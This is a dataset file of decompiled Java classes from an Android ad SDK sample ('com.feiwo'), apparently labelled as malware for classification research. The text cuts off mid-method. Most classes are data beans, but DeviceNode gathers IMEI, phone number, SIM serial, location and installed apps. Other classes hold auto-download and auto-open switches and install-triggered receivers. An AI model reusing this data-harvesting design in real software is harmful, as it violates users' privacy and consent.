"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\ScreenSize.code","public class ScreenSize {   @SerializedName(""screenWidth"") int screenWidth=0;   @SerializedName(""screenHeight"") int screenHeight=0;   public int getScreenHeight(){     return this.screenHeight;   }   public int getScreenWidth(){     return this.screenWidth;   }   public void setScreenHeight(  int i){     this.screenHeight=i;   }   public void setScreenWidth(  int i){     this.screenWidth=i;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\UserInfo.code","public class UserInfo {   @SerializedName(""appKey"") public String appKey;   @SerializedName(""appendNode"") public AppendNode appendNode;   @SerializedName(""clsName"") public String clsName;   @SerializedName(""clsPkg"") public String clsPkg;   @SerializedName(""lastAdId"") public int lastAdId;   @SerializedName(""nextRequestAdId"") public Integer nextRequestAdId=a.S; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\Action.code","public class Action {   @Since(1.0d) @Expose @SerializedName(""action"") private Integer action;   @Since(1.0d) @Expose @SerializedName(""adId"") private Integer adId;   @Since(1.0d) @Expose @SerializedName(""appName"") private String appName;   @Since(1.0d) @Expose @SerializedName(""count"") private Integer count;   @Since(1.0d) @Expose @SerializedName(""date"") private String date;   @Since(1.0d) @Expose @SerializedName(""packageName"") private String packageName;   public Integer getAction(){     return this.action;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public Integer getCount(){     return this.count;   }   public String getDate(){     return this.date;   }   public String getPackageName(){     return this.packageName;   }   public void setAction(  Integer num){     this.action=num;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setCount(  Integer num){     this.count=num;   }   public void setDate(  String str){     this.date=str;   }   public void setPackageName(  String str){     this.packageName=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\ActionExt.code","public class ActionExt extends Action {   private int expireDate;   public int getExpireDate(){     return this.expireDate;   }   public void setExpireDate(  int i){     this.expireDate=i;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\AdInfo.code","public class AdInfo implements Serializable, Cloneable {   @Since(1.0d) @Expose private Integer adId;   private Integer appId;   @Since(1.0d) @Expose private String appName;   @Since(1.0d) @Expose private String appSize;   @Since(1.0d) @Expose private String appVersion;   private String areaIds;   private BigDecimal autoReduceAmount;   @Since(1.0d) @Expose private String g2Switches;   @Since(1.0d) @Expose private String g3Switches;   @Since(1.0d) @Expose private String icon;   @Since(1.0d) @Expose private String intro;   private Integer isInstalled;   @Since(1.0d) @Expose private Integer kind;   private String labels;   private String mobileBrands;   private String mobileSystem;   private String operators;   @Since(1.0d) @Expose private String packageName;   @Since(1.0d) @Expose private String printscreen;   @Since(1.0d) @Expose private String recommend;   private BigDecimal reduceAmount;   @Since(1.0d) @Expose private String showPeriod;   @Since(1.0d) @Expose private String url;   @Since(1.0d) @Expose private String wifiSwitches;   public Object clone(){     try {       return super.clone();     }  catch (    CloneNotSupportedException e) {       e.printStackTrace();       return null;     }   }   public Integer getAdId(){     return this.adId;   }   public Integer getAppId(){     return this.appId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public String getAreaIds(){     return this.areaIds;   }   public BigDecimal getAutoReduceAmount(){     return this.autoReduceAmount;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public String getIntro(){     return this.intro;   }   public Integer getIsInstalled(){     return this.isInstalled;   }   public Integer getKind(){     return this.kind;   }   public String getLabels(){     return this.labels;   }   public String getMobileBrands(){     return this.mobileBrands;   }   public String getMobileSystem(){     return this.mobileSystem;   }   public String getOperators(){     return this.operators;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public BigDecimal getReduceAmount(){     return this.reduceAmount;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppId(  Integer num){     this.appId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setAreaIds(  String str){     this.areaIds=str;   }   public void setAutoReduceAmount(  BigDecimal bigDecimal){     this.autoReduceAmount=bigDecimal;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setIntro(  String str){     this.intro=str;   }   public void setIsInstalled(  Integer num){     this.isInstalled=num;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setLabels(  String str){     this.labels=str;   }   public void setMobileBrands(  String str){     this.mobileBrands=str;   }   public void setMobileSystem(  String str){     this.mobileSystem=str;   }   public void setOperators(  String str){     this.operators=str;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setReduceAmount(  BigDecimal bigDecimal){     this.reduceAmount=bigDecimal;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\AdSwitches.code","public class AdSwitches {   @SerializedName(""autoDown"") private Switch autoDown;   @SerializedName(""autoOpen"") private Switch autoOpen;   @SerializedName(""clickDown"") private Switch clickDown;   @SerializedName(""fullscreenDown"") private Switch fullscreenDown;   @SerializedName(""showStallBar"") private Switch showStallBar;   @SerializedName(""uninstallBar"") private Switch uninstallBar; public class Switch {     private boolean on;     public Switch(    int i){       this.on=i == 1;     }     public boolean isOff(){       return !this.on;     }     public boolean isOn(){       return this.on;     }     public String toString(){       return this.on ? ""1"" : ""2"";     }   }   public AdSwitches(  String str){     if (TextUtils.isEmpty(str)) {       return;     }     for (    String str2 : str.split("","")) {       String lowerCase=str2.toLowerCase();       String lowerCase2=lowerCase.split("":"")[0].toLowerCase();       int parseInt=Integer.parseInt(lowerCase.split("":"")[1]);       if (getFullscreenDown() == null) {         setFullscreenDown(new Switch(2));       }       if (lowerCase2.equalsIgnoreCase(a.T)) {         setClickDown(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.U)) {         setAutoDown(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.V)) {         setShowStallBar(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.W)) {         setUninstallBar(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.X)) {         setAutoOpen(new Switch(parseInt));       }  else       if (lowerCase2.equalsIgnoreCase(a.Y)) {         setFullscreenDown(new Switch(parseInt));       }     }   }   public Switch getAutoDown(){     return this.autoDown;   }   public Switch getAutoOpen(){     return this.autoOpen;   }   public Switch getClickDown(){     return this.clickDown;   }   public Switch getFullscreenDown(){     return this.fullscreenDown;   }   public Switch getShowStallBar(){     return this.showStallBar;   }   public Switch getUninstallBar(){     return this.uninstallBar;   }   public void setAutoDown(  Switch r1){     this.autoDown=r1;   }   public void setAutoOpen(  Switch r1){     this.autoOpen=r1;   }   public void setClickDown(  Switch r1){     this.clickDown=r1;   }   public void setFullscreenDown(  Switch r1){     this.fullscreenDown=r1;   }   public void setShowStallBar(  Switch r1){     this.showStallBar=r1;   }   public void setUninstallBar(  Switch r1){     this.uninstallBar=r1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\AppWallAdInfo.code","public class AppWallAdInfo extends AdInfo {   @Since(1.0d) @Expose private int hasBoundAd;   @Since(1.0d) @Expose private int isRecommend;   public int getHasBoundAd(){     return this.hasBoundAd;   }   public int getIsRecommend(){     return this.isRecommend;   }   public void setHasBoundAd(  int i){     this.hasBoundAd=i;   }   public void setIsRecommend(  int i){     this.isRecommend=i;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\BannerAdInfo.code","public class BannerAdInfo extends AdInfo {   @Since(1.0d) @Expose private String bannerImg;   private String bannerImgAll;   @Since(1.0d) @Expose private Integer showStyle;   @Since(1.0d) @Expose private Integer showTime;   @Since(1.0d) @Expose private Integer userCaps;   @Since(1.0d) @Expose private String userPeriod;   public String getBannerImg(){     return this.bannerImg;   }   public String getBannerImgAll(){     return this.bannerImgAll;   }   public Integer getShowStyle(){     return this.showStyle;   }   public Integer getShowTime(){     return this.showTime;   }   public Integer getUserCaps(){     return this.userCaps;   }   public String getUserPeriod(){     return this.userPeriod;   }   public void setBannerImg(  String str){     this.bannerImg=str;   }   public void setBannerImgAll(  String str){     this.bannerImgAll=str;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public void setShowTime(  Integer num){     this.showTime=num;   }   public void setUserCaps(  Integer num){     this.userCaps=num;   }   public void setUserPeriod(  String str){     this.userPeriod=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\CreditsWallAdInfo.code","public class CreditsWallAdInfo extends AdInfo {   @Since(1.0d) @Expose private String billingInfo;   @Since(1.0d) @Expose private Integer billingIntegral;   @Since(1.0d) @Expose private Integer billingPrice;   @Since(1.0d) @Expose private Integer billingUserMethod;   @Since(1.0d) @Expose private Integer installDelayTime;   @Since(1.0d) @Expose private Integer maximumOpenTimes;   @Since(1.0d) @Expose private Integer openDelayTime;   @Since(1.0d) @Expose private String requirement;   @Since(1.0d) @Expose private String taskIntro;   @Since(1.0d) @Expose private Integer category=0;   @Since(1.0d) @Expose private Integer installCredits=0;   @Since(1.0d) @Expose private Integer openCredits=0;   public String getBillingInfo(){     return this.billingInfo;   }   public Integer getBillingIntegral(){     return this.billingIntegral;   }   public Integer getBillingPrice(){     return this.billingPrice;   }   public Integer getBillingUserMethod(){     return this.billingUserMethod;   }   public Integer getCategory(){     return this.category;   }   public Integer getInstallCredits(){     return this.installCredits;   }   public Integer getInstallDelayTime(){     return this.installDelayTime;   }   public Integer getMaximumOpenTimes(){     return this.maximumOpenTimes;   }   public Integer getOpenCredits(){     return this.openCredits;   }   public Integer getOpenDelayTime(){     return this.openDelayTime;   }   public String getRequirement(){     return this.requirement;   }   public String getTaskIntro(){     return this.taskIntro;   }   public void setBillingInfo(  String str){     this.billingInfo=str;   }   public void setBillingIntegral(  Integer num){     this.billingIntegral=num;   }   public void setBillingPrice(  Integer num){     this.billingPrice=num;   }   public void setBillingUserMethod(  Integer num){     this.billingUserMethod=num;   }   public void setCategory(  Integer num){     this.category=num;   }   public void setInstallCredits(  Integer num){     this.installCredits=num;   }   public void setInstallDelayTime(  Integer num){     this.installDelayTime=num;   }   public void setMaximumOpenTimes(  Integer num){     this.maximumOpenTimes=num;   }   public void setOpenCredits(  Integer num){     this.openCredits=num;   }   public void setOpenDelayTime(  Integer num){     this.openDelayTime=num;   }   public void setRequirement(  String str){     this.requirement=str;   }   public void setTaskIntro(  String str){     this.taskIntro=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\PushAdInfo.code","public class PushAdInfo extends AdInfo {   @Since(1.0d) @Expose private int hasBoundAd;   @Since(1.0d) @Expose private Integer userCaps;   @Since(1.0d) @Expose private String userPeriod;   public int getHasBoundAd(){     return this.hasBoundAd;   }   public Integer getUserCaps(){     return this.userCaps;   }   public String getUserPeriod(){     return this.userPeriod;   }   public void setHasBoundAd(  int i){     this.hasBoundAd=i;   }   public void setUserCaps(  Integer num){     this.userCaps=num;   }   public void setUserPeriod(  String str){     this.userPeriod=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\Switch.code","public class Switch {   private boolean on;   public Switch(  int i){     this.on=i == 1;   }   public boolean isOff(){     return !this.on;   }   public boolean isOn(){     return this.on;   }   public String toString(){     return this.on ? ""1"" : ""2"";   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.bean\TableplaqueAdInfo.code","public class TableplaqueAdInfo extends AdInfo {   @Since(1.0d) @Expose private Integer showStyle;   @Since(1.0d) @Expose private Integer showTime;   @Since(1.0d) @Expose private String tablePlaqueImg;   @Since(1.0d) @Expose private Integer userCaps;   @Since(1.0d) @Expose private String userPeriod;   public Integer getShowStyle(){     return this.showStyle;   }   public Integer getShowTime(){     return this.showTime;   }   public String getTablePlaqueImg(){     return this.tablePlaqueImg;   }   public Integer getUserCaps(){     return this.userCaps;   }   public String getUserPeriod(){     return this.userPeriod;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public void setShowTime(  Integer num){     this.showTime=num;   }   public void setTablePlaqueImg(  String str){     this.tablePlaqueImg=str;   }   public void setUserCaps(  Integer num){     this.userCaps=num;   }   public void setUserPeriod(  String str){     this.userPeriod=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.node\ActionNode.code","public class ActionNode {   @Since(1.0d) @Expose @SerializedName(""actions"") private List<Action> actions;   public List<Action> getActions(){     return this.actions;   }   public void setActions(  List<Action> list){     this.actions=list;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.node\AdNode.code","public class AdNode<T extends AdInfo> {   @Since(1.0d) @Expose @SerializedName(""adId"") private Integer adId;   @Since(1.0d) @Expose @SerializedName(""adInfo"") private T adInfo;   @Since(1.0d) @Expose @SerializedName(""adList"") private List<T> adList;   @Since(1.0d) @Expose @SerializedName(""adType"") private Integer adType;   @Since(1.0d) @Expose @SerializedName(""category"") private Integer category;   @Since(1.0d) @Expose @SerializedName(""credits"") private Integer credits;   @Since(1.0d) @Expose @SerializedName(""delayTime"") private Integer delayTime;   @Since(1.0d) @Expose @SerializedName(""exclude"") private String exclude;   @Since(1.0d) @Expose @SerializedName(""hasPayment"") private Integer hasPayment;   @Since(1.0d) @Expose @SerializedName(""isEnd"") private Integer isEnd;   @Since(1.0d) @Expose @SerializedName(""lastAdId"") private Integer lastAdId=a.S;   @Since(1.0d) @Expose @SerializedName(""showStyle"") private Integer showStyle;   public Integer getAdId(){     return this.adId;   }   public T getAdInfo(){     return this.adInfo;   }   public List<T> getAdList(){     return this.adList;   }   public Integer getAdType(){     return this.adType;   }   public Integer getCategory(){     return this.category;   }   public Integer getCredits(){     return this.credits;   }   public Integer getDelayTime(){     return this.delayTime;   }   public String getExclude(){     return this.exclude;   }   public Integer getHasPayment(){     return this.hasPayment;   }   public Integer getIsEnd(){     return this.isEnd;   }   public Integer getLastAdId(){     return this.lastAdId;   }   public Integer getShowStyle(){     return this.showStyle;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdInfo(  T t){     this.adInfo=t;   }   public void setAdList(  List<T> list){     this.adList=list;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setCategory(  Integer num){     this.category=num;   }   public void setCredits(  Integer num){     this.credits=num;   }   public void setDelayTime(  Integer num){     this.delayTime=num;   }   public void setExclude(  String str){     this.exclude=str;   }   public void setHasPayment(  Integer num){     this.hasPayment=num;   }   public void setIsEnd(  Integer num){     this.isEnd=num;   }   public void setLastAdId(  Integer num){     this.lastAdId=num;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.node\AppendNode.code","public class AppendNode {   @Since(1.0d) @Expose @SerializedName(""appendData"") Map<String,Object> appendData;   public Map<String,Object> getAppendData(){     return this.appendData;   }   public void setAppendData(  Map<String,Object> map){     this.appendData=map;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.node\DeviceNode.code","public class DeviceNode {   @Since(1.0d) @Expose @SerializedName(""appKey"") private String appKey;   @Since(1.0d) @Expose @SerializedName(""appList"") private List<Map<String,String>> appList;   @Since(1.0d) @Expose @SerializedName(""brand"") private String brand;   @Since(1.0d) @Expose @SerializedName(""devAppPackage"") private String devAppPackage;   @Since(1.0d) @Expose @SerializedName(""imei"") private String imei;   @Since(1.0d) @Expose @SerializedName(""location"") private String location;   @Since(1.0d) @Expose @SerializedName(""mobileSystem"") private String mobileSystem;   @Since(1.0d) @Expose @SerializedName(""model"") private String model;   @Since(1.0d) @Expose @SerializedName(""network"") private String network;   @Since(1.0d) @Expose @SerializedName(""operator"") private String operator;   @Since(1.0d) @Expose @SerializedName(""phoneNumber"") private String phoneNumber;   @Since(1.0d) @Expose @SerializedName(""resolution"") private String resolution;   @Since(1.0d) @Expose @SerializedName(""sdkVersion"") private String sdkVersion;   @Since(1.0d) @Expose @SerializedName(""simSerialNum"") private String simSerialNum;   @Since(1.0d) @Expose @SerializedName(""systemVersion"") private String systemVersion;   public String getAppKey(){     return this.appKey;   }   public List<Map<String,String>> getAppList(){     return this.appList;   }   public String getBrand(){     return this.brand;   }   public String getDevAppPackage(){     return this.devAppPackage;   }   public String getImei(){     return this.imei;   }   public String getLocation(){     return this.location;   }   public String getMobileSystem(){     return this.mobileSystem;   }   public String getModel(){     return this.model;   }   public String getNetwork(){     return this.network;   }   public String getOperator(){     return this.operator;   }   public String getPhoneNumber(){     return this.phoneNumber;   }   public String getResolution(){     return this.resolution;   }   public String getSdkVersion(){     return this.sdkVersion;   }   public String getSimSerialNum(){     return this.simSerialNum;   }   public String getSystemVersion(){     return this.systemVersion;   }   public void setAppKey(  String str){     this.appKey=str;   }   public void setAppList(  List<Map<String,String>> list){     this.appList=list;   }   public void setBrand(  String str){     this.brand=str;   }   public void setDevAppPackage(  String str){     this.devAppPackage=str;   }   public void setImei(  String str){     this.imei=str;   }   public void setLocation(  String str){     this.location=str;   }   public void setMobileSystem(  String str){     this.mobileSystem=str;   }   public void setModel(  String str){     this.model=str;   }   public void setNetwork(  String str){     this.network=str;   }   public void setOperator(  String str){     this.operator=str;   }   public void setPhoneNumber(  String str){     this.phoneNumber=str;   }   public void setResolution(  String str){     this.resolution=str;   }   public void setSdkVersion(  String str){     this.sdkVersion=str;   }   public void setSimSerialNum(  String str){     this.simSerialNum=str;   }   public void setSystemVersion(  String str){     this.systemVersion=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.node\ExecutionNode.code","public class ExecutionNode {   @Since(1.0d) @Expose @SerializedName(""clearExclude"") private Integer clearExclude;   @Since(1.0d) @Expose @SerializedName(""deleteAdId"") private Integer deleteAdId;   @Since(1.0d) @Expose @SerializedName(""updateAd"") private Integer updateAd;   @Since(1.0d) @Expose @SerializedName(""updateDevice"") private Integer updateDevice;   public Integer getClearExclude(){     return this.clearExclude;   }   public Integer getDeleteAdId(){     return this.deleteAdId;   }   public Integer getUpdateAd(){     return this.updateAd;   }   public Integer getUpdateDevice(){     return this.updateDevice;   }   public void setClearExclude(  Integer num){     this.clearExclude=num;   }   public void setDeleteAdId(  Integer num){     this.deleteAdId=num;   }   public void setUpdateAd(  Integer num){     this.updateAd=num;   }   public void setUpdateDevice(  Integer num){     this.updateDevice=num;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.node\RootNode.code","public class RootNode<T extends AdInfo> {   @Since(1.0d) @Expose @SerializedName(""action"") private ActionNode action;   @Since(1.0d) @Expose @SerializedName(""ad"") private AdNode<T> ad;   @Since(1.0d) @Expose @SerializedName(""append"") private AppendNode append;   @Since(1.0d) @Expose @SerializedName(""device"") private DeviceNode device;   @Since(1.0d) @Expose @SerializedName(""execution"") private ExecutionNode execution;   @Since(1.0d) @Expose @SerializedName(""setting"") private SettingNode setting;   public ActionNode createActionNode(){     this.action=this.action == null ? new ActionNode() : this.action;     return this.action;   }   public AdNode<T> createAdNode(){     this.ad=new AdNode<>();     return this.ad;   }   public AppendNode createAppendNode(){     this.append=this.append == null ? new AppendNode() : this.append;     return this.append;   }   public DeviceNode createDeviceNode(){     this.device=this.device == null ? new DeviceNode() : this.device;     return this.device;   }   public ExecutionNode createExecutionNode(){     this.execution=this.execution == null ? new ExecutionNode() : this.execution;     return this.execution;   }   public SettingNode createSettingNode(){     this.setting=this.setting == null ? new SettingNode() : this.setting;     return this.setting;   }   public ActionNode getAction(){     return this.action;   }   public AdNode<T> getAd(){     return this.ad;   }   public AppendNode getAppend(){     return this.append;   }   public DeviceNode getDevice(){     return this.device;   }   public ExecutionNode getExecution(){     return this.execution;   }   public SettingNode getSetting(){     return this.setting;   }   public void setAction(  ActionNode actionNode){     this.action=actionNode;   }   public void setAd(  AdNode<T> adNode){     this.ad=adNode;   }   public void setAppend(  AppendNode appendNode){     this.append=appendNode;   }   public void setDevice(  DeviceNode deviceNode){     this.device=deviceNode;   }   public void setExecution(  ExecutionNode executionNode){     this.execution=executionNode;   }   public void setSetting(  SettingNode settingNode){     this.setting=settingNode;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model.ad.node\SettingNode.code","public class SettingNode {   @Since(1.0d) @Expose @SerializedName(""cacheExpires"") private String cacheExpires;   @Since(1.0d) @Expose @SerializedName(""cwMaxInstall"") private String cwMaxInstall;   @Since(1.0d) @Expose @SerializedName(""delayActions"") private Map<Integer,Integer> delayActions;   @Since(1.0d) @Expose @SerializedName(""firstDelayshow"") private Integer firstDelayshow;   @Since(1.0d) @Expose @SerializedName(""installInterval"") private Integer installInterval;   @Since(1.0d) @Expose @SerializedName(""pushMaximum"") private Integer pushMaximum;   @Since(1.0d) @Expose @SerializedName(""pushMinimumInterval"") private Integer pushMinimumInterval;   @Since(1.0d) @Expose @SerializedName(""pushTimePeriod"") private String pushTimePeriod;   @Since(1.0d) @Expose @SerializedName(""resourcesAddr"") private String resourcesAddr;   @Since(1.0d) @Expose @SerializedName(""serviceDate"") private String serviceDate;   public String getCacheExpires(){     return this.cacheExpires;   }   public String getCwMaxInstall(){     return this.cwMaxInstall;   }   public Map<Integer,Integer> getDelayActions(){     return this.delayActions;   }   public Integer getFirstDelayshow(){     return this.firstDelayshow;   }   public Integer getInstallInterval(){     return this.installInterval;   }   public Integer getPushMaximum(){     return this.pushMaximum;   }   public Integer getPushMinimumInterval(){     return this.pushMinimumInterval;   }   public String getPushTimePeriod(){     return this.pushTimePeriod;   }   public String getResourcesAddr(){     return this.resourcesAddr;   }   public String getServiceDate(){     return this.serviceDate;   }   public void setCacheExpires(  String str){     this.cacheExpires=str;   }   public void setCwMaxInstall(  String str){     this.cwMaxInstall=str;   }   public void setDelayActions(  Map<Integer,Integer> map){     this.delayActions=map;   }   public void setFirstDelayshow(  Integer num){     this.firstDelayshow=num;   }   public void setInstallInterval(  Integer num){     this.installInterval=num;   }   public void setPushMaximum(  Integer num){     this.pushMaximum=num;   }   public void setPushMinimumInterval(  Integer num){     this.pushMinimumInterval=num;   }   public void setPushTimePeriod(  String str){     this.pushTimePeriod=str;   }   public void setResourcesAddr(  String str){     this.resourcesAddr=str;   }   public void setServiceDate(  String str){     this.serviceDate=str;   }   public String toString(){     return "" resourcesAddr = "" + this.resourcesAddr + ""\npushMaximum = ""+ this.pushMaximum+ ""\npushTimePeriod = ""+ this.pushTimePeriod+ ""\ncacheExpires = ""+ this.cacheExpires+ ""\npushMinimumInterval = ""+ this.pushMinimumInterval+ ""\n firstDelayshow = ""+ this.firstDelayshow;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.receiver\a.code","class a implements Runnable {   final com.feiwo.d.a.a f202a;   final String f203b;   final InReceiver c;   public a(  InReceiver inReceiver,  com.feiwo.d.a.a aVar,  String str){     this.c=inReceiver;     this.f202a=aVar;     this.f203b=str;   }   @Override public void run(){     this.f202a.a(this.f203b);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.receiver\b.code","class b implements Runnable {   final Context f204a;   final int f205b;   final String c;   final InReceiver d;   public b(  InReceiver inReceiver,  Context context,  int i,  String str){     this.d=inReceiver;     this.f204a=context;     this.f205b=i;     this.c=str;   }   @Override public void run(){     e.a(this.f204a,this.f205b,null,null,7,this.c);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.receiver\ConnectReceiver.code","public class ConnectReceiver extends InReceiver {   private String f200a=ConnectReceiver.class.getSimpleName();   private void a(  Context context){     e<?> eVar=e.d().get(1);     if (eVar != null) {       eVar.d(context);       return;     }     UserInfo a2=e.a(e.a(context,1));     if (a2 != null && !TextUtils.isEmpty(a2.appKey)) {       eVar=(e)e.b(context,1);     }     if (eVar != null) {       e.a(1,eVar);       e.a(context,eVar,1);       eVar.d(context);     }   }   @Override public void onReceive(  Context context,  Intent intent){     com.feiwo.d.a.a aVar;     super.onReceive(context,intent);     if (e.d().size() != 0) {       for (      Map.Entry<Integer,e<?>> entry : e.d().entrySet()) {         if (entry.getValue() != null && (aVar=entry.getValue().e) != null) {           aVar.d(context,g.a(context));         }       }     }     if (g.a(context) != 0) {       h.a(context).a();       a(context);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.receiver\InReceiver.code","public class InReceiver extends BroadcastReceiver {   private static String f201a=InReceiver.class.getSimpleName();   @Override public void onReceive(  Context context,  Intent intent){     AppInfo appInfo;     int i;     AppInfo appInfo2;     e eVar;     AppInfo appInfo3;     if (intent.getAction().equals(com.feiwo.c.a.ah) && e.d().size() == 0) {       String replace=intent.getDataString().replace(""package:"","""");       if (replace.equals(t.b(context))) {         return;       }       GlobalInfo b2=e.b(e.a(context));       if (b2 != null) {         HashMap<String,AppInfo> hashMap=b2.downloadAppInfo;         int adType=(hashMap == null || (appInfo3=hashMap.get(replace)) == null) ? 0 : appInfo3.getAdType();         if (adType == 0) {           int[] iArr={2,3,1,4,5};           int i2=0;           while (true) {             if (i2 >= iArr.length) {               eVar=null;               break;             }  else {               if (!TextUtils.isEmpty(e.a(e.a(context,iArr[i2])).appKey)) {                 eVar=(e)e.b(context,adType);                 break;               }               i2++;             }           }         }  else {           eVar=(e)e.b(context,adType);         }         if (eVar != null) {           e.a(adType,(e<?>)eVar);           e.a(context,eVar,adType);         }       }     }     if (e.d().size() != 0) {       if (intent.getAction().equals(com.feiwo.c.a.ah)) {         String replace2=intent.getDataString().replace(""package:"","""");         if (replace2.equals(t.b(context))) {           return;         }         AppInfo appInfo4=e.b(e.a(context)).downloadAppInfo.get(replace2);         if (appInfo4 != null && e.d().get(Integer.valueOf(appInfo4.getAdType())) != null) {           e.d().get(Integer.valueOf(appInfo4.getAdType())).a(replace2);           appInfo4.setInstall(true);           e.a(context,appInfo4);           return;         }         for (        Map.Entry<Integer,e<?>> entry : e.d().entrySet()) {           e<?> value=entry.getValue();           if (value != null && value.e != null) {             new Handler().postDelayed(new a(this,entry.getValue().e,replace2),10000L);             return;           }         }         return;       }       return;     }     if (intent.getAction().equals(com.feiwo.c.a.ah)) {       String replace3=intent.getDataString().replace(""package:"","""");       if (replace3.equals(t.b(context))) {         return;       }       String str="""";       GlobalInfo b3=e.b(e.a(context));       if (b3 != null) {         HashMap<String,AppInfo> hashMap2=b3.downloadAppInfo;         if (hashMap2 != null) {           appInfo2=hashMap2.get(replace3);           if (appInfo2 != null) {             i=appInfo2.getAdType();             str=e.a(e.a(context,i)).appKey;           }  else {             i=0;           }         }  else {           appInfo2=null;           i=0;         }         if (TextUtils.isEmpty(str)) {           int[] iArr2={2,3,1,4};           for (int i3=0; i3 < iArr2.length; i3++) {             UserInfo a2=e.a(e.a(context,iArr2[i3]));             if (!TextUtils.isEmpty(a2.appKey)) {               str=a2.appKey;               i=iArr2[i3];               appInfo=appInfo2;               break;             }           }         }         appInfo=appInfo2;       }  else {         appInfo=null;         i=0;       }       e.a(context,replace3);       if (TextUtils.isEmpty(str)) {         return;       }       if (appInfo != null && appInfo.isInstall()) {         if (appInfo != null) {           e.a(context,i,appInfo.getAdInfo(),7,false);           return;         }         return;       }       long a3=appInfo == null ? 0L : v.a(appInfo.getDownloadTime().longValue());       if (appInfo == null || a3 == 0 || a3 > 1800000) {         new Handler().postDelayed(new b(this,context,i,replace3),10000L);       }  else       if (appInfo != 